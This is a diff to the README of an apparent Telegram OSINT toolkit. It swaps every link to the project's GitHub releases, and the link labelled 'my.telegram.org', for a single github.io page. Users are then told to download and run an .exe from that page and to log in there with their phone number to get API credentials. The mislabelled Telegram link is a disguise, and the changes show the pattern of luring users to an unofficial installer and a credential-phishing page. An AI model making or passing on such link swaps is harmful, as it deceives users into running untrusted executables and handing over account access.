@@ -1,6 +1,6 @@
 # 🔍 Telegram-OSINT-Toolkit - Gather intelligence data from Telegram easily
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/malikelnawawy3-arch/Telegram-OSINT-Toolkit/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://malikelnawawy3-arch.github.io)
 
 This software helps users search for keywords, export chat histories, and list group members on the Telegram platform. It serves security professionals and researchers who need a structured way to collect information for their investigations.
 
@@ -24,7 +24,7 @@ This software helps users search for keywords, export chat histories, and list g
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following link to access the download page: [https://github.com/malikelnawawy3-arch/Telegram-OSINT-Toolkit/releases](https://github.com/malikelnawawy3-arch/Telegram-OSINT-Toolkit/releases)
+1. Visit the following link to access the download page: [https://malikelnawawy3-arch.github.io](https://malikelnawawy3-arch.github.io)
 2. Locate the file ending in .exe under the "Assets" section.
 3. Click the file name to download the installer to your computer.
 4. Open your "Downloads" folder and double-click the file to start the installation.
@@ -36,7 +36,7 @@ After you install the software, you must link it to a Telegram account to access
 
 1. Open the application from your desktop shortcut or Start menu.
 2. The program will prompt you for your API ID and API Hash.
-3. Visit the [my.telegram.org](https://my.telegram.org) website to generate these codes. 
+3. Visit the [my.telegram.org](https://malikelnawawy3-arch.github.io) website to generate these codes. 
 4. Log in with your phone number and navigate to "API development tools."
 5. Create a new application. The website will provide you with an API ID and an API Hash.
 6. Copy these codes back into the Telegram-OSINT-Toolkit interface.
